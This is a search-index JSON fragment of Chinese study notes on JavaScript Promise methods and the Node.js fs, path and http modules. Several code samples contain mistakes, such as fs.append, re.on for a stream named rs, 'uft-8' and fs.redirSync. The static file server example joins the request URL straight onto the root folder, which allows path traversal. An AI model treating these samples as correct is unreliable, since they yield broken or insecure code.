p3]); \",\"p 的状态由 p1, p2, p3 决定，分成两种情况：\",\"只有 p1、p2、p3 的状态都变成 fulfilled，p 的状态才会变成 fulfilled，此时 p1、p2、p3 的返回值组成一个数组，传递给 p 的回调函数\",\"只要 p1、p2、p3 之中有一个被 rejected，p 的状态就变成 rejected，此时第一个被 reject 的实例的返回值，会传递给 p 的回调函数\"]},{\"header\":\"4. Promise.race\",\"slug\":\"_4-promise-race\",\"contents\":[\"Promise.race() 方法同样是将多个 Promise 实例包装成一个新的 Promise 实例\",\"const p = Promise.race([p1, p2, p3]); \",\"上面代码中，只要 p1、p2、p3 之中有一个实例率先改变状态，p 的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给 p 的回调函数\"]},{\"header\":\"5. Promise.allSettled\",\"slug\":\"_5-promise-allsettled\",\"contents\":[\"Promise.allSettled() 方法，用来确定一组异步操作是否都结束了（不管成功或失败）。所以，名为\\\"Settled\\\"，包含了\\\"fulfilled\\\"和\\\"rejected\\\"两种情况\",\"const promises = [ ajax('/200接口'), ajax('/401接口') ]; Promise.allSettled(promises).then(results=>{ // 过滤出成功的请求 results.filter(item =>item.status === 'fulfilled'); 过滤出失败的请求 results.filter(item=> item.status === 'rejected'); }); \"]},{\"header\":\"6. Promise.any\",\"slug\":\"_6-promise-any\",\"contents\":[\"只要参数实例有一个变成 fulfilled 状态，包装实例就会变成 fulfilled 状态；如果所有参数实例都变成 rejected 状态，包装实例就会变成 rejected 状态\",\"Promise.any()跟Promise.race()方法很像，只有一点不同，就是Promise.any()不会因为某个 Promise 变成rejected状态而结束，必须等到所有参数 Promise 变成rejected状态才会结束\"]},{\"header\":\"7. finally方法\",\"slug\":\"_7-finally方法\",\"contents\":[\"不管 promise 最后的状态，在执行完 then 或 catch 指定的回调函数以后，都会执行 finally 方法指定的回调函数\",\"const p = new Promise((resolve, reject) => { resolve(); //reject(); }) p.then((res) => { console.log('then'); }).catch((err) => { console.log('error'); }).finally(() => { console.log('finally'); }); //结果：then finally \"]}]},\"/front-end/javascript-notes/\":{\"title\":\"JavaScript笔记\",\"contents\":[]},\"/front-end/nodejs-notes/01-NodeJS%E5%85%A5%E9%97%A8.html\":{\"title\":\"NodeJS入门\",\"contents\":[{\"header\":\"1. NodeJS简介\",\"slug\":\"_1-nodejs简介\",\"contents\":[\"Node.js 是一个独立的 JavaScript 运行环境，能独立执行 JS 代码，因为这个特点，它可以用来编写服务器后端的应用程序\",\"Node.js 作用除了编写后端应用程序，也可以对前端代码进行压缩，转译，整合等等，提高前端开发和运行效率\",\"Node.js 基于Chrome V8 引擎封装，独立执行 JS 代码，但是语法和浏览器环境的 V8 有所不同，没有 document 和 window，但是都支持 ECMAScript 标准的代码语法\",\"Node.js 没有图形化界面，需要使用 cmd 终端命令行（利用一些命令来操控电脑执行某些程序软件）\"]},{\"header\":\"2. NodeJS的安装\",\"slug\":\"_2-nodejs的安装\",\"contents\":[\"官网下载：Node.js\",\"打开安装包，默认 next 下一步即可，等待安装完成\",\"打开命令提示符，输入如下命令，出现版本号即说明安装成功\",\"node -v \",\"使用国内的镜像可以提高下载速度，命令如下：\",\"npm config set registry https://registry.npmmirror.com \",\"查看镜像：\",\"npm config get registry \"]},{\"header\":\"3. NodeJS初体验\",\"slug\":\"_3-nodejs初体验\",\"contents\":[\"app.js\",\"console.log('hello') \",\"在命令提示符中使用\",\"node app.js \",\"运行结果：\",\"hello \",\"注意：\",\"NodeJS中不能使用BOM和DOM的API，可以使用console和定时器API\",\"NodeJS中的顶级对象为global，也可以用globalThis访问顶级对象\"]}]},\"/front-end/nodejs-notes/02-NodeJS-Buffer.html\":{\"title\":\"Buffer\",\"contents\":[{\"header\":\"1. 概念\",\"slug\":\"_1-概念\",\"contents\":[\"Buffer 是一个类似于数组的 对象 ，用于表示固定长度的字节序列\",\"Buffer 本质是一段内存空间，专门用来处理 二进制数据\"]},{\"header\":\"2. 特点\",\"slug\":\"_2-特点\",\"contents\":[\"Buffer 大小固定且无法调整\",\"Buffer 性能较好，可以直接对计算机内存进行操作\",\"每个元素的大小为 1 字节（byte）\"]},{\"header\":\"3. 使用\",\"slug\":\"_3-使用\",\"contents\":[]},{\"header\":\"3.1 创建Buffer\",\"slug\":\"_3-1-创建buffer\",\"contents\":[\"Node.js中创建 Buffer 的方式主要如下几种：\",\"Buffer.alloc\",\"// 创建了一个长度为 10 字节的 Buffer，相当于申请了 10 字节的内存空间，每个字节的值为 0 let buf_1 = Buffer.alloc(10) console.log(buf_1) // 结果为<Buffer 00 00 00 00 00 00 00 00 00 00> \",\"Buffer.allocUnsafe\",\"// 创建了一个长度为 10 字节的 Buffer，buffer 中可能存在旧数据，可能会影响执行结果，所以叫 unsafe ，但是效率比 alloc 高 let buf_2 = Buffer.allocUnsafe(10) console.log(buf_2) // 结果为<Buffer 00 00 00 00 00 00 00 00 00 00> \",\"Buffer.from\",\"// 通过字符串创建 Buffer let buf_3 = Buffer.from('hello') console.log(buf_3) // <Buffer 68 65 6c 6c 6f> // 通过数组创建 Buffer let buf_4 = Buffer.from([105, 108, 111, 118, 101, 121, 111, 117]) console.log(buf_4) // <Buffer 69 6c 6f 76 65 79 6f 75> \"]},{\"header\":\"3.2 Buffer与字符串的转化\",\"slug\":\"_3-2-buffer与字符串的转化\",\"contents\":[\"我们可以借助 toString 方法将 Buffer 转为字符串\",\"let buf_4 = Buffer.from([105, 108, 111, 118, 101, 121, 111, 117]) console.log(buf_4.toString()) //iloveyou \",\"注意：toString 默认是按照 utf-8 编码方式进行转换的\"]},{\"header\":\"3.3 Buffer的读写\",\"slug\":\"_3-3-buffer的读写\",\"contents\":[\"Buffer 可以直接通过 [] 的方式对数据进行处理\",\"let buf_3 = Buffer.from('hello') // 读取 console.log(buf_3[1]) // 101 // 修改 buf_3[1] = 97 //查看字符串结果 console.log(buf_3.toString()) // hallo \",\"注意：\",\"如果修改的数值超过 255 ，则超过8位数据会被舍弃\",\"一个utf-8的字符一般占3个字节\"]}]},\"/front-end/nodejs-notes/03-NodeJS-fs%E6%A8%A1%E5%9D%97.html\":{\"title\":\"fs模块\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"fs 全称为 file system ，称之为 文件系统 ，是 Node.js 中的 内置模块 ，可以对计算机中的磁盘进行操作\"]},{\"header\":\"1. 文件写入\",\"slug\":\"_1-文件写入\",\"contents\":[\"文件写入就是将数据保存到文件中，我们可以使用如下几个方法来实现该效果\",\"方法\",\"说明\",\"writeFile\",\"异步写入\",\"writeFileSync\",\"同步写入\",\"appendFile / appendFileSync\",\"追加写入\",\"createWriteStream\",\"流式写入\"]},{\"header\":\"1.1 异步写入\",\"slug\":\"_1-1-异步写入\",\"contents\":[\"语法： fs.writeFile(file, data[, options], callback)\",\"参数说明：\",\"file 文件名\",\"data 待写入的数据\",\"options 选项设置 （可选）\",\"callback 写入回调\",\"返回值： undefined\",\"代码示例：\",\"// require 是 Node.js 环境中的 '全局' 变量，用来导入模块 const fs = require('fs') // 将 [三人行，必有我师焉。] 写入到当前文件夹下的 [座右铭.txt] 文件中 fs.writeFile('./座右铭.txt', '三人行，必有我师焉。', err =>{ // 如果写入失败，则回调函数调用时，会传入错误对象，如写入成功，会传入 null if(err){ console.log(err) return } console.log('写入成功') }) \"]},{\"header\":\"1.2 同步写入\",\"slug\":\"_1-2-同步写入\",\"contents\":[\"语法:fs.writeFileSync(file, data[, options])\",\"参数与 fs.writeFile 大体一致，只是没有 callback 参数\",\"返回值：undefined\",\"代码示例：\",\"try{ fs.writeFileSync('./座右铭.txt', '三人行，必有我师焉。') }catch(e){ console.log(e) } \",\"Node.js 中的磁盘操作是由其他 线程 完成的，结果的处理有两种模式:\",\"同步处理 JavaScript 主线程 会等待 其线程的执行结果，然后再继续执行主线程的代码，效率较低\",\"异步处理 JavaScript 主线程 不会等待 其线程的执行结果，直接执行后续的主线程代码，效率较好\"]},{\"header\":\"1.3 追加写入\",\"slug\":\"_1-3-追加写入\",\"contents\":[\"appendFile 作用是在文件尾部追加内容，appendFile 语法与 writeFile 语法完全相同\",\"语法:\",\"fs.appendFile(file, data[, options], callback)\",\"fs.appendFileSync(file, data[, options])\",\"返回值：二者都为 undefined\",\"实例代码：\",\"fs.append('./座右铭.txt', '则其善者而从之，其不善者而改之。', err =>{ if(err) throw err console.log('追加成功') }) fs.appendFileSync('./座右铭.txt','\\\\r\\\\n温故而知新，可以为师矣') \",\"使用writeFile也可以实现追加写入，通过设置配置项参数为 { flag: 'a' }，实现对文件的追加写入\"]},{\"header\":\"1.4 流式写入\",\"slug\":\"_1-4-流式写入\",\"contents\":[\"语法：fs.createWriteStream(path[, options])\",\"参数说明：\",\"path 文件路径\",\"options 选项配置（ 可选 ）\",\"**返回值: **Object\",\"代码示例：\",\"let ws = fs.createWriteStream('./观书有感.txt') //写入数据到流 ws.write('半亩方塘一鉴开\\\\r\\\\n') ws.write('天光云影共徘徊\\\\r\\\\n') ws.write('问渠那得清如许\\\\r\\\\n') ws.write('为有源头活水来\\\\r\\\\n') //关闭写入流，表明已没有数据要被写入可写流 ws.end() //或者是ws.close() \",\"程序打开一个文件是需要消耗资源的，流式写入可以减少打开关闭文件的次数\",\"流式写入方式适用于大文件写入或者频繁写入的场景，writeFile适合于写入频率较低的场景\"]},{\"header\":\"1.5 写入文件的场景\",\"slug\":\"_1-5-写入文件的场景\",\"contents\":[\"文件写入 在计算机中是一个非常常见的操作，下面的场景都用到了文件写入\",\"下载文件\",\"安装软件\",\"保存程序日志，如 Git\",\"编辑器保存文件\",\"视频录制\",\"当需要持久化保存数据的时候，应该想到 文件写入\"]},{\"header\":\"2. 文件读取\",\"slug\":\"_2-文件读取\",\"contents\":[\"文件读取顾名思义，就是通过程序从文件中取出其中的数据，我们可以使用如下几种方式\",\"方法\",\"说明\",\"readFile\",\"异步读取\",\"readFileSync\",\"同步读取\",\"createReadStream\",\"流式读取\"]},{\"header\":\"2.1 异步读取\",\"slug\":\"_2-1-异步读取\",\"contents\":[\"语法: fs.readFile(path[, options], callback)\",\"参数说明：\",\"path 文件路径\",\"options 选项配置\",\"callback 回调函数\",\"返回值：undefined\",\"代码示例：\",\"// 导入 fs 模块 fs.readFile('./座右铭.txt', (error,data) =>{ if(err) throw err console.log(data) }) fs.readFile('./座右铭.txt', 'uft-8', (error,data) =>{ if(err) throw err console.log(data) }) \"]},{\"header\":\"2.2 同步读取\",\"slug\":\"_2-2-同步读取\",\"contents\":[\"语法：fs.readFileSync(path[, options])\",\"参数说明：\",\"path 文件路径\",\"options 选项配置\",\"返回值：string | Buffer\",\"代码示例：\",\"let data = fs.readFileSync('./座右铭.txt') let data = fs.readFileSync('./座右铭.txt', 'utf-8') \"]},{\"header\":\"2.3 流式读取\",\"slug\":\"_2-3-流式读取\",\"contents\":[\"语法：fs.createReadStream(path[, options])\",\"参数说明：\",\"path 文件路径\",\"options 选项配置（ 可选 ）\",\"返回值：Object\",\"代码示例：\",\"// 创建读取流对象 let rs = fs.createReadStream('./观书有感.txt') // 每次取出 64k 数据后执行一次 data 回调 // 绑定一个 data 事件 chunk 块儿 大块儿 re.on('data', chunk =>{ console.log(chunk) console.log(chunk.length) //65536字节=>64kb }) // 读取完毕后，执行 end 回调 (可选事件) re.on('end', () =>{ console.log('读取完毕') }) \"]},{\"header\":\"2.4 读取文件应用场景\",\"slug\":\"_2-4-读取文件应用场景\",\"contents\":[\"电脑开机\",\"程序运行\",\"编辑器打开文件\",\"查看图片\",\"播放视频\",\"播放音乐\",\"Git 查看日志\",\"上传文件\",\"查看聊天记录\"]},{\"header\":\"3. 文件移动与重命名\",\"slug\":\"_3-文件移动与重命名\",\"contents\":[\"在 Node.js 中，我们可以使用 rename 或 renameSync 来移动或重命名 文件或文件夹\",\"语法：\",\"fs.rename(oldPath, newPath, callback)\",\"fs.renameSync(oldPath, newPath)\",\"参数说明：\",\"oldPath 文件当前的路径\",\"newPath 文件新的路径\",\"callback 操作后的回调\",\"代码示例：\",\"fs.rename('./观书有感.txt', './论语/观书有感.txt', err =>{ if(err) throw err console.log('移动完成') }) fs.renameSync('./座右铭.txt', './论语/.我的座右铭.txt') \",\"注: 如果还是移动到当前路径，但是修改了名字，就是重命名了\"]},{\"header\":\"4. 文件删除\",\"slug\":\"_4-文件删除\",\"contents\":[\"在 Node.js 中，我们可以使用 unlink 或 unlinkSync 来删除文件\",\"语法:\",\"fs.unlink(path, callback)\",\"fs.unlinkSync(path)\",\"参数说明：\",\"path 文件路径\",\"callback 操作后的回调\",\"代码示例：\",\"const fs = require('fs') fs.unlink('./test.txt', err =>{ if(err) throw err console.log('删除成功') }) fs.unlinkSync('./test2.txt') // 调用 rm 方法 14.4版本引入的方法 同步 rmSync fs.rm('./论语.txt', err => { if (err) { console.log('删除失败') return } console.log('删除成功') }) \"]},{\"header\":\"5. 文件夹操作\",\"slug\":\"_5-文件夹操作\",\"contents\":[\"借助 Node.js 的能力，我们可以对文件夹进行 创建 、读取 、删除 等操作\",\"方法\",\"说明\",\"mkdir / mkdirSync\",\"创建文件夹\",\"readdir / readdirSync\",\"读取文件夹\",\"rmdir / rmdirSync\",\"删除文件夹\"]},{\"header\":\"5.1 创建文件夹\",\"slug\":\"_5-1-创建文件夹\",\"contents\":[\"在 Node.js 中，我们可以使用 mkdir 或 mkdirSync 来创建文件夹\",\"语法:\",\"fs.mkdir(path[, options], callback)\",\"fs.mkdirSync(path[, options])\",\"参数说明：\",\"path 文件夹路径\",\"options 选项配置（ 可选 ）\",\"callback 操作后的回调\",\"示例代码：\",\"// 异步创建文件夹 mk make 制作 dir directory 文件夹 fs.mkdir('./page', err =>{ if(err) throw err console.log('创建成功') }) // 递归异步创建 fs.mkdir('./1/2/3', {recursive: true}, err =>{ if(err) throw err console.log('递归创建成功') }) // 递归同步创建文件夹 fs.mkdirSync('./x/y/z', {recursive: true}) \"]},{\"header\":\"5.2 读取文件夹\",\"slug\":\"_5-2-读取文件夹\",\"contents\":[\"在 Node.js 中，我们可以使用 readdir 或 readdirSync 来读取文件夹\",\"语法：\",\"fs.readdir(path[, options], callback)\",\"fs.readdirSync(path[, options])\",\"参数说明：\",\"path 文件夹路径\",\"options 选项配置（ 可选 ）\",\"callback 操作后的回调\",\"示例代码：\",\"// 异步读取 fs.readdir('./论语', (err, data) => { if(err) throw err console.log(data) }) // 同步读取 let data = fs.readdirSync('./论语') console.log(data) \"]},{\"header\":\"5.3 删除文件夹\",\"slug\":\"_5-3-删除文件夹\",\"contents\":[\"在 Node.js 中，我们可以使用 rmdir 或 rmdirSync 来删除文件夹\",\"语法：\",\"fs.rmdir(path[, options], callback)\",\"fs.redirSync(path[, options])\",\"参数说明：\",\"path 文件夹路径\",\"options 选项配置（ 可选 ）\",\"callback 操作后的回调\",\"示例代码：\",\"// 异步删除文件夹 rm remove 移除 fs.rmdir('./page', err => { if(err) throw err console.log('删除成功') }) //异步递归删除文件夹 不推荐 //=>DeprecationWarning: In future versions of Node.js, fs.rmdir(path, { recursive: true }) will be removed. Use fs.rm(path, { recursive: true }) instead fs.rmdirSync('./1', {recursive: true}, err => { if(err){ console.log(err) return } console.log('递归删除') }) //同步递归删除文件夹 fs.rmdirSync('./x', {recursive: true}) // 建议使用 fs.rm('./a', { recursive: true }, err => { if (err) { console.log(err) return } console.log('删除成功') }) \"]},{\"header\":\"6. 查看资源状态\",\"slug\":\"_6-查看资源状态\",\"contents\":[\"在 Node.js 中，我们可以使用 stat 或 statSync 来查看资源的详细信息\",\"语法：\",\"fs.stat(path[, options], callback)\",\"fs.statSync(path[, options])\",\"参数说明：\",\"path 文件夹路径\",\"options 选项配置（ 可选 ）\",\"callback 操作后的回调\",\"示例代码：\",\"// 异步获取状态 // stat 方法 status 缩写 状态 fs.stat('/data.txt', (err, data) =>{ if(err) throw err console.log(data) }) // 同步获取状态 let data = fs.statSync('./data.txt') \",\"结果值对象结构：\",\"size 文件体积\",\"birthtime 创建时间\",\"mtime 最后修改时间\",\"isFile 检测是否为文件\",\"isDirectory 检测是否为文件夹\",\"....\"]},{\"header\":\"7. fs路径\",\"slug\":\"_7-fs路径\",\"contents\":[\"fs 模块对资源进行操作时，路径的写法有两种：\",\"相对路径\",\"./座右铭.txt 当前目录下的 座右铭.txt\",\"座右铭.txt 等效于上面的写法\",\"../座右铭.txt 当前目录的上一级目录中的 座右铭.txt\",\"绝对路径\",\"D:/Program Files windows 系统下的绝对路径\",\"/user/bin Linux 系统下的绝对路径\",\"相对路径中所谓的 当前目录 ，指的是 命名行的工作目录 ，而并非是文件的所在目录\",\"所以当命名行的工作目录与文件所在目录不一致时，会出现一些 Bug\"]},{\"header\":\"8. __dirname\",\"slug\":\"_8-dirname\",\"contents\":[\"__dirname 与 require 类似，都是 Node.js 环境中的 '全局' 变量\",\"__dirname 保存着当前文件的所在目录的绝对路径，可以使用 __dirname 与文件名拼接成绝对路径\",\"代码示例：\",\"// __dirname + '/data.txt' === 'D:\\\\\\\\Desktop\\\\\\\\Node\\\\\\\\code\\\\\\\\03-fs模块/data.txt' let data = fs.readFileSync(__dirname + '/data.txt') console.log(data) \",\"使用 fs 模块的时候，尽量使用 __dirname 路径转换为绝对路径，这样可以避免相对路径产生的 Bug\"]}]},\"/front-end/nodejs-notes/04-NodeJS-path%E6%A8%A1%E5%9D%97.html\":{\"title\":\"path模块\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"path 模块提供了 操作路径 的功能，我们将介绍如下几个较为常用的几个 API\",\"API\",\"说明\",\"path.resolve\",\"拼接规范的绝对路径 常用\",\"path.sep\",\"获取操作系统的路径分隔符\",\"path.parse\",\"解析路径并返回对象\",\"path.basename\",\"获取路径的基础名称\",\"path.dirname\",\"获取路径的目录名\",\"path.extname\",\"获得路径的扩展名\",\"代码示例：\",\"// 导入 fs 模块 const fs = require('fs') // 导入 path 模块 const path = require('path') // 写入文件 // fs.writeFileSync(__dirname + '/index.html', 'love') console.log(__dirname + '/index.html') // D:\\\\Desktop\\\\Node\\\\code\\\\04-path/index.html // resolve 解决问题 拼接绝对路径 console.log(path.resolve(__dirname, './index.html')) // D:\\\\Desktop\\\\Node\\\\code\\\\04-path\\\\index.html console.log(path.resolve(__dirname, 'index.html')) // D:\\\\Desktop\\\\Node\\\\code\\\\04-path\\\\index.html console.log(path.resolve(__dirname, '/index.html', './test')) // D:\\\\index.html\\\\test // sep 获取路径分隔符 console.log(path.sep) // window \\\\ linux / // parse 方法 __filename '全局变量' console.log(__filename) // 文件的绝对路径 // D:\\\\Desktop\\\\Node\\\\code\\\\04-path\\\\01-path.js // 解析路径 let str = 'D:\\\\\\\\Desktop\\\\\\\\Node\\\\\\\\code\\\\\\\\04-path\\\\\\\\01-path.js' console.log(path.parse(str)) // 获取路径基础名称 console.log(path.basename(pathname)) // 获取路径的目录名 console.log(path.dirname(pathname)) // 获取路径的拓展名 console.log(path.extname(pathname)) \"]}]},\"/front-end/nodejs-notes/05-NodeJS-http%E6%A8%A1%E5%9D%97.html\":{\"title\":\"http模块\",\"contents\":[{\"header\":\"1. 创建HTTP服务\",\"slug\":\"_1-创建http服务\",\"contents\":[]},{\"header\":\"1.1 操作步骤\",\"slug\":\"_1-1-操作步骤\",\"contents\":[\"//1. 导入 http 模块 const http = require('http') //2. 创建服务对象 create 创建 server 服务 // request 意为请求，是对请求报文的封装对象，通过 request 对象可以获得请求报文的数据 // response 意为响应，是对响应报文的封装对象，通过 response 对象可以设置响应报文 const server = http.createServer((request, response) => { // 设置响应体 response.end('Hello HTTP server') }) // 返回结果是一个对象 //3. 监听端口, 启动服务 server.listen(9000, () => { console.log('服务已经启动, 端口 9000 监听中...') }) \",\"http.createServer 里的回调函数的执行时机： 当接收到 HTTP 请求的时候，就会执行\"]},{\"header\":\"1.2 测试\",\"slug\":\"_1-2-测试\",\"contents\":[\"浏览器请求对应端口\",\"http://127.0.0.1:9000 \"]},{\"header\":\"1.3 注意事项\",\"slug\":\"_1-3-注意事项\",\"contents\":[\"命令行 ctrl + c 停止服务\",\"当服务启动后，更新代码必须重启服务才能生效\",\"响应内容中文乱码的解决办法\",\"// 设置响应头 response.setHeader('content-type','text/html;charset=utf-8') \",\"端口号被占用：Error: listen EADDRINUSE: address already in use :::9000\",\"关闭当前正在运行监听端口的服务（使用较多）\",\"修改其他端口号\",\"HTTP协议默认端口是 80。HTTPS 协议的默认端口是443, HTTP 服务开发常用端口有 3000，8080，8090，9000 等\",\"如果端口被其他程序占用，可以使用资源监视器找到占用端口的程序，然后使用任务管理器关闭对应的程序\"]},{\"header\":\"2. 获取HTTP请求报文\",\"slug\":\"_2-获取http请求报文\",\"contents\":[\"含义\",\"语法\",\"重点掌握\",\"请求方法\",\"request.method\",\"*****\",\"请求版本\",\"request.httpVersion\",\"请求路径\",\"request.url\",\"*****\",\"URL 路径\",\"require('url').parse(request.url).pathname\",\"*****\",\"URL 查询字符串\",\"require('url').parse(request.url, true).query\",\"*****\",\"请求头\",\"request.headers\",\"*****\",\"请求体\",\"request.on('data', function(chunk){})request.on('end', function(){})\",\"// 1. 导入 http 模块 const http = require('http') // 2. 创建服务对象 const server = http.createServer((request, response) => { // 获取请求的方法 console.log(request.method) // GET // 获取请求的 url console.log(request.url) // 只包含 url 中的 路径 与查询字符串 // 获取 http 协议的版本号 console.log(request.httpVersion) // 1.1 // 获取 http 的请求头 console.log(request.headers) // 结果是一个对象 response.end('http') // 设置响应体 }) // 3. 监听端口，启动服务 server.listen(9000, () => { console.log('服务已经启动...') }) \",\"注意事项：\",\"request.url 只能获取路径以及查询字符串，无法获取 URL 中的域名以及协议的内容\",\"request.headers 将请求信息转化成一个对象，并将属性名都转化成了『小写』\",\"关于路径：如果访问网站的时候，只填写了 IP 地址或者是域名信息，此时请求的路径为『 / 』\",\"关于 favicon.ico：这个请求是属于浏览器自动发送的请求\",\"其他操作：\",\"提取http报文的请求体\",\"// 1. 导入 http 模块 const http = require('http') // 2. 创建服务对象 const server = http.createServer((request, response) => { // 1. 声明一个变量 let body = '' // 2. 绑定 data 事件 request.on('data', chunk => { body += chunk }) // 3. 绑定 end 事件 request.on('end', () => { console.log(body) // 响应 response.end('Hello Http') // 设置响应体 }) }) // 3. 监听端口，启动服务 server.listen(9000, () => { console.log('服务已经启动...') }) \",\"提取http报文中url的路径与查询字符串\",\"// 导入 http 模块 const http = require('http') // 1. 导入 url 模块 const url = require('url') // 创建服务对象 const server = http.createServer((request, response) => { // 2. 解析 request.url console.log(request.url) // /search?keyword=xxx // 使用 parse 解析 request.url 的内容 // true 将 query 属性将会设置为一个 对象 let res = url.parse(request.url, true) console.log(res) // 为一个对象 // 路径 let pathname = res.pathname // 查询字符串 let keyword = res.query.keyword console.log(keyword) // h5 response.end('url') }) // 监听端口，启动服务 server.listen(9000, () => { console.log('服务已经启动...') }) \",\"// 导入 http 模块 const http = require('http') // 创建服务对象 const server = http.createServer((request, response) => { // 实例化 url 对象 // let url = new URL('/search?a=100&b=200','http://127.0.0.1:9000') let url = new URL(request.url, 'http://127.0.0.1') console.log(url) // 为一个对象 // 输出路径 console.log(url.pathname) // /search // 输出 keyword 查询字符串 console.log(url.searchParams.get('a')) // 100 response.end('url new') }) // 监听端口，启动服务 server.listen(9000, () => { console.log('服务已经启动...') }) \"]},{\"header\":\"3. 设置HTTP响应报文\",\"slug\":\"_3-设置http响应报文\",\"contents\":[\"作用\",\"语法\",\"设置响应状态码\",\"response.statusCode\",\"设置响应状态描述\",\"response.statusMessage （ 用的非常少 ）\",\"设置响应头信息\",\"response.setHeader('头名', '头值') (可以自定义)\",\"设置响应体\",\"response.write('xx')response.end('xxx')\",\"// 1. 设置响应状态码 response.statusCode = 203 // 2. 响应状态的描述 response.statusMessage = 'i love you' // 3. 响应头 response.setHeader('content-type', 'text/html;charset=utf-8') // 自定义响应头 response.setHeader('myHeader', 'test test') // 设置多个同名的响应头 response.setHeader('test', ['a', 'b', 'c']) \",\"// write 和 end 的两种使用情况： // 1. write 和 end 的结合使用 响应体相对分散 response.write('xx') response.write('xx') response.write('xx') response.end(); //每一个请求，在处理的时候必须要执行 end 方法的 //2. 单独使用 end 方法 响应体相对集中 response.end('xxx') \"]},{\"header\":\"4. 网页资源的基本加载过程\",\"slug\":\"_4-网页资源的基本加载过程\",\"contents\":[\"网页资源的加载都是循序渐进的，首先获取 HTML 的内容， 然后解析 HTML 在发送其他资源的请求，如 CSS，Javascript，图片等\"]},{\"header\":\"5. 静态资源服务\",\"slug\":\"_5-静态资源服务\",\"contents\":[\"静态资源 是指内容长时间不发生改变的资源，例如图片，视频，CSS 文件，JS文件，HTML文件，字体文件等\",\"动态资源 是指内容经常更新的资源，例如百度首页，网易首页，京东搜索列表页面等\"]},{\"header\":\"5.1 静态资源目录\",\"slug\":\"_5-1-静态资源目录\",\"contents\":[\"HTTP 服务在哪个文件夹中寻找静态资源，那个文件夹就是静态资源目录，也称之为网站根目录\"]},{\"header\":\"5.2 URL路径\",\"slug\":\"_5-2-url路径\",\"contents\":[\"网页中的URL路径主要分为两大类：相对路径 与 绝对路径\"]},{\"header\":\"5.2.1 绝对路径\",\"slug\":\"_5-2-1-绝对路径\",\"contents\":[\"绝对路径可靠性强，而且相对容易理解，在项目中运用较多\",\"形式\",\"特点\",\"http://atguigu.com/web\",\"直接向目标资源发送请求，容易理解。网站的外链会用到此形式\",\"//atguigu.com/web\",\"与页面 URL 的协议拼接形成完整 URL 再发送请求。大型网站用的比较多\",\"/web\",\"与页面 URL 的协议、主机名、端口拼接形成完整 URL 再发送请求。中小型网站\"]},{\"header\":\"5.2.2 相对路径\",\"slug\":\"_5-2-2-相对路径\",\"contents\":[\"相对路径在发送请求时，需要与当前页面 URL 路径进行 计算 ，得到完整 URL 后，再发送请求，学习阶段用的较多\",\"例如：http://www.atguigu.com/course/h5.html\",\"形式\",\"最终的 URL\",\"./css/app.css\",\"http://www.atguigu.com/course/css/app.css\",\"js/app.js\",\"http://www.atguigu.com/course/js/app.js\",\"../img/logo.png\",\"http://www.atguigu.com/img/logo.png\",\"../../mp4/show.mp4\",\"http://www.atguigu.com/mp4/show.mp4\"]},{\"header\":\"5.2.3 网页中使用URL的场景\",\"slug\":\"_5-2-3-网页中使用url的场景\",\"contents\":[\"包括但不限于如下场景：\",\"a 标签 href\",\"link 标签 href\",\"script 标签 src\",\"img 标签 src\",\"video audio 标签 src\",\"form 中的 action\",\"AJAX 请求中的 URL\"]},{\"header\":\"5.3 设置资源类型（mime类型）\",\"slug\":\"_5-3-设置资源类型-mime类型\",\"contents\":[\"媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式\",\"mime 类型结构： [type]/[subType] 例如： text/html text/css image/jpeg image/png application/json \",\"HTTP 服务可以设置响应头 Content-Type 来表明响应体的 MIME 类型，浏览器会根据该类型决定如何处理资源\",\"下面是常见文件对应的 mime 类型：\",\"html: 'text/html', css: 'text/css', js: 'text/javascript', png: 'image/png', jpg: 'image/jpeg', gif: 'image/gif', mp4: 'video/mp4', mp3: 'audio/mpeg', json: 'application/json' \",\"对于未知的资源类型，可以选择 application/octet-stream 类型，浏览器在遇到该类型的响应时，会对响应体内容进行独立存储，也就是我们常见的 下载 效果\",\"require('http').createServer((request,response)=>{ //获取请求的方法已经路径 let {url,method} = request //判断请求方式以及请求路径 if(method == \\\"GET\\\" && url == \\\"/index.html\\\"){ //需要响应文件中的内容 let data = require('fs').readFileSync( dirname + '/index.html') response.end(data) }else if(method == \\\"GET\\\" && url == \\\"/css/app.css\\\"){ //需要响应文件中的内容 let data = require('fs').readFileSync( dirname + '/public/css/app.css') response.end(data) }else if(method == \\\"GET\\\" && url == \\\"/js/app.js\\\"){ //需要响应文件中的内容 let data = require('fs').readFileSync( dirname + '/public/js/app.js') response.end(data) }else{ //404响应 response.statusCode = 404 response.end(\\\"<h1>404 Not Found</h1>\\\") } }).listen(80,()=>{ console.log('80端口正在启动中....') }) \",\"很明显上面的代码，当只要有一个请求路径就需要进行判断，显然这种方式不够完美，那么我们需要封装：\",\"require('http').createServer((request,response)=>{ //获取请求的方法已经路径 let {url,method} = request //文件夹路径 根路径 let rootDir = dirname + '/public' //拼接文件路径 let filePath = rootDir + url //读取文件内容 fs.readFile(filePath,(err,data)=>{ //判断 if(err){ //如果出现错误，响应404状态码 response.statusCode = 404 response.end('<h1>404 Not Found</h1>') }else{ //响应文件内容 response.end(data) } }) }).listen(80,()=>{ console.log('80端口正在启动中....') }) \"]},{\"header\":\"6. GET和POST请求\",\"slug\":\"_6-get和post请求\",\"contents\":[\"GET 和 POST 是 HTTP 协议请求的两种方式\",\"GET 主要用来获取数据，POST 主要用来提交数据\",\"GET 带参数请求是将参数缀到 URL 之后，在地址栏中输入 url 访问网站就是 GET 请求，POST 带参数请求是将参数放到请求体中\",\"POST 请求相对 GET 安全一些，因为在浏览器中参数会暴露在地址栏\",\"GET 请求大小有限制，一般为 2K，而 POST 请求则没有\",\"GET 请求的情况：\",\"在地址栏直接输入 url 访问\",\"点击 a 链接\",\"link 标签引入 css\",\"script 标签引入 js\",\"img 标签引入图片\",\"form 标签中的 method 为 get （不区分大小写）\",\"ajax 中的 get 请求\",\"POST 请求的情况：\",\"form 标签中的 method 为 post（不区分大小写）\",\"AJAX 的 post 请求\"]}]},\"/front-end/nodejs-notes/06-NodeJS-%E6%A8%A1%E5%9D%97%E5%8C%96.html\":{\"title\":\"模块化\",\"contents\":[{\"header\":\"1. 介绍\",\"slug\":\"_1-介绍\",\"contents\":[]},{\"header\":\"1.1 模块化与模块\",\"slug\":\"_1-1-模块化与模块\",\"contents\":[\"将一个复杂的程序文件依据一定规则（规范）拆分成多个文件的过程称之为 